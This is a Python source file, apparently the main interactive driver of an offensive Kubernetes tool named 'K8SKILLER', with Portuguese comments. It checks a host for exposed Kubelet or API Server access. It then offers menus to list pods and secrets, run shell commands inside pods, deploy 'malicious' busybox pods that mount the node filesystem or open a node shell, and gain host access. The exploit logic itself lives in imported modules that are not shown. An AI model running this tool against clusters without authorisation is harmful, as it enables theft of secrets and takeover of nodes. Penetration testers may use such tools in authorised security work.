import urllib3
from art import *
from terminaltables import AsciiTable


from vulnsVerify import *
from podTable import *
from listarPods import *
from menu import *
from shells import *
from podDeploy import *

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

tprint("K8SKILLER")

print("1 - Search for vulnerabilities in the host.")
print()
print("2 - Using Service Account.")
print()

opcao = int(input("Option: "))
print()

if opcao == 2:
    host = input("Host: ")
    sa = input("Service Account: ")
    ns = input("Service Account Namespace: ")
    print()
    menu_service()
    while True:
            command = input("k8skiller: ")
            print()
            # Opção 1 - LISTAGEM DE PODS
            if command == "1":
                listar_pods_service(host, sa, ns)
            # Opção 2 - SHELL SIMPLES NO POD ESCOLHIDO
            elif command == "2":
                pod_name = input("Pod Name: ")
                if pod_name == "exit":
                    pass
                else:
                    shell_service(host, sa, ns, pod_name)
            # Opção 3 - DEPLOY DE POD MALICIOSO
            elif command == "3":
                tabela = [["ID", "POD", "DESCRIPTION"], ["1", "Busybox Mount Node Filesystem", "Monta o filesystem do Node."], ["2", "Busybox RCE Node", "Obtem uma shell no Node."]]
                tabela_ascii = AsciiTable(tabela)
                print(tabela_ascii.table)
                print()
                malicioso = input("Option ID: ")
                if malicioso == "exit":
                    pass
                else:
                    pod_deploy_service(host, sa, ns, int(malicioso))

            # Opção 4 - DELETAR POD MALICIOSO
            elif command == "4":
                pod_name = input("Pod Name: ")
                if pod_name == "exit":
                    pass
                else:
                    pod_delete_service(host, sa, ns, pod_name)

            # Opção menu - RETORNA AS OPÇÕES DO MENU
            elif command == "menu":
                menu_service()

            # Opção exit - FECHA A FERRAMENTA
            elif command == "exit":
                break

elif opcao == 1:
    host = input("Host: ")

    print()
    print("Searching Vulnerabilities...")

    #Verificando se as vulnerabilidades existem;
    kubelet, apiserver, hostFull = vuln_verify(host)

    # Caso o cluster não esteja vulnerável a nenhum dos ataques!
    if kubelet == False and apiserver == "False":
        print("[-] Host not vulnerable to a Kubelet or API Server attack!")

    # Caso o cluster esteja vulnerável ao ataque ao Kubelet
    elif kubelet == True:
        print()
        print("[+] Host may be vulnerable to a Kubelet Attack!")
        print()
        menu_kubelet()
        pod, namespace, container = listar_pods(hostFull)
        while True:
            command = input("k8skiller: ")

            # Opção 1 - LISTAGEM DE PODS
            if command == "1":
                pod, namespace, container = listar_pods(hostFull)
                podTable = pod_table_kubelet(pod, namespace, container)
                print(podTable)

                print()
                print("--------------------------------------------------------------------------------------------------------")
                print()
            # Opção 2 - LISTAGEM DE SECRETS
            elif command == "2":
                id = 0
                for i in range(len(pod)):
                    if "tiller" in pod[i]:
                        id = i
                listar_secrets_kubelet(host, pod, container, id)

            # Opção 3 - SHELL SIMPLES NO POD ESCOLHIDO
            elif command == "3":
                num = input("Pod ID: ")
                if num == "exit":
                    pass
                else:
                    id = int(num) - 1
                    while True:
                        print()
                        comando_exec = input(pod[id]+" # ")
                        shellPod = shell(comando_exec, hostFull, namespace, pod, container, id)
                        if shellPod == "exit":
                            break
                        else:
                            print(shell(comando_exec, hostFull, namespace, pod, container, id))

                print()
                print("--------------------------------------------------------------------------------------------------------")
                print()

            # Opção 4 - DEPLOY DE POD MALICIOSO
            elif command == "4":
                tabela = [["ID", "POD MALICIOSO", "DESCRIÇÃO"], ["1", "Busybox Mount Node Filesystem", "Monta o filesystem do Node."], ["2", "Busybox RCE Node", "Obtem uma shell no Node."]]
                tabela_ascii = AsciiTable(tabela)
                print(tabela_ascii.table)
                print()
                malicioso = int(input("Option ID: "))
                if malicioso == "exit":
                    pass
                else:
                # Obtenção correta do id do pod com privilégios de criação de pods, que será utilizado para o RCE.
                    id = 0
                    pod, namespace, container = listar_pods(hostFull)
                    for i in range(len(pod)):
                        if "tiller" in pod[i]:
                            id = i + 1
                    pod_deploy(hostFull, pod, namespace, container, malicioso, id)

                print()
                print("--------------------------------------------------------------------------------------------------------")
                print()

            # Opção 5 - DELETAR POD MALICIOSO
            elif command == "5":
                pod, namespace, container = listar_pods(hostFull)
                pod_id = 0
                pod_id_malicioso = ""
                malicioso = 0
                for i in range(len(pod)):
                    if pod[i] == "busybox-rce" or pod[i] == "busybox-filesystem":
                        pod_id_malicioso = pod[i]
                        for y in range(len(container)):
                            if container[y] == "tiller":
                                pod_id = y
                            else:
                                pass

                        print("*** POD BUSYBOX SPOTTED! ***")
                        print()
                        malicioso = int(input("Are you sure? (1 - YES / 0 - NO): "))
                if malicioso == 1:
                    pod_delete(hostFull, pod, namespace, container, pod_id, pod_id_malicioso)

                print()
                print("--------------------------------------------------------------------------------------------------------")
                print()

            # Opção 6 - OBTER ACESSO AO HOST
            elif command == "6":
                hostShell(host, hostFull, namespace, pod, container)

                print()
                print("--------------------------------------------------------------------------------------------------------")
                print()

            # Opção menu - RETORNA AS OPÇÕES DO MENU
            elif command == "menu":
                menu_kubelet()

            # Opção exit - FECHA A FERRAMENTA
            elif command == "exit":
                break

    # Caso o cluster esteja vulnerável ao ataque a API Server
    if apiserver == True:
        print("[+] Host may be vulnerable to an API Server attack!")
        print()
        menu_api()

        while True:
            command = input("k8skiller: ")

            # Opção 1 - LISTAGEM DE SECRETS;
            if command == "1":
                print()
                print("--------------------------------------------------------------------------------------------------------")
                print()
                listar_secrets(hostFull)
                print("--------------------------------------------------------------------------------------------------------")
                print()
                                

            # Opção 2 - LISTAGEM DE PODS;
            elif command == "2":
                print()
                print("--------------------------------------------------------------------------------------------------------")
                print()
                listar_pods_api(hostFull)
                print("--------------------------------------------------------------------------------------------------------")
                print()

            # Opção 3 - SHELL EM POD;
            elif command == "3":
                nome = input("Pod Name: ")
                if nome == "exit":
                    pass
                else:
                    namespace_str = input("Pod Namespace: ")
                    if namespace_str == "exit":
                        pass
                    else:
                        shell_api(hostFull, namespace_str, nome)

                print()
                print("--------------------------------------------------------------------------------------------------------")
                print()

            # Opção 4 - DEPLOY POD MALICIOSO;
            elif command == "4":
                tabela = [["ID", "POD MALICIOSO", "DESCRIÇÃO"], ["1", "Busybox Mount Node Filesystem", "Monta o filesystem do Node."], ["2", "Busybox RCE Node", "Obtem uma shell no Node."]]
                tabela_ascii = AsciiTable(tabela)
                print(tabela_ascii.table)
                print()
                malicioso = input("Option ID: ")
                
                # Obtenção correta do id do pod com privilégios de criação de pods, que será utilizado para o RCE.
                if malicioso == "exit":
                    pass
                else:
                    pod_deploy_api(hostFull, int(malicioso))

                print()
                print("--------------------------------------------------------------------------------------------------------")
                print()

            # Opção 5 - DELETAR POD;
            elif command == "5":
                pod = input("Pod Name to delete: ")
                if pod == "exit":
                    pass
                else:
                    print()
                    ns = input("Pod Namespace: ")
                    if ns == "exit":
                        pass
                    else:
                        malicioso = int(input("Are you sure you want to delete the pod " +(pod)+ " in the namespace " + (ns) + " (1 - YES / 0 - NO): "))
                    if malicioso == 1:
                        pod_delete_api(hostFull, ns, pod)

                    print()
                    print("--------------------------------------------------------------------------------------------------------")
                    print()


            # Opção menu - RETORNA AS OPÇÕES DO MENU
            elif command == "menu":
                menu_api()

            # Opção exit - FECHA A FERRAMENTA
            elif command == "exit":
                break